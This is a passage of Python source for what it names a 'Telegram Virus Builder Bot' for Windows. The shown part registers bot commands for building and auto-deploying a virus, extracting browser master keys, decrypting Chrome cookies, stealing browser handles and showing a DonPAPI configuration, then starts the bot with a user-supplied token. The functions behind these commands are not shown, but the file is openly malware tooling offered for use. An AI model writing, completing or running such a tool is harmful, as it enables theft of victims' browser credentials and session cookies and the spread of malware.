        application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, self.handle_message))
        
        # Set bot commands
        commands = [
            BotCommand("start", "Start the Windows bot"),
            BotCommand("build", "Build a Windows virus"),
            BotCommand("extract_keys", "Extract browser master keys"),
            BotCommand("process_cookies", "Process browser cookies"),
            BotCommand("decrypt_chrome", "Decrypt Chrome v20+ cookies"),
            BotCommand("steal_handles", "Steal browser handles"),
            BotCommand("config", "Show DonPAPI configuration"),
            BotCommand("auto_build", "Auto-build and deploy virus")
        ]
        
        application.bot.set_my_commands(commands)
        
        # Start the bot
        print("🤖 Starting Telegram Virus Builder Bot - Windows...")
        print("📱 Bot is running. Press Ctrl+C to stop.")
        
        application.run_polling()

def main():
    """Main entry point"""
    # Get bot token from environment or input
    bot_token = os.getenv('TELEGRAM_BOT_TOKEN')
    
    if not bot_token:
        print("🔑 Please enter your Telegram Bot Token:")
        bot_token = input("Token: ").strip()
        
        if not bot_token:
            print("❌ Bot token is required!")
            return
    
    try:
        bot = TelegramVirusBotWindows(bot_token)
        bot.run()
    except KeyboardInterrupt:
        print("\n👋 Bot stopped by user")
    except Exception as e:
        print(f"❌ Error: {{e}}")

if __name__ == "__main__":
    main()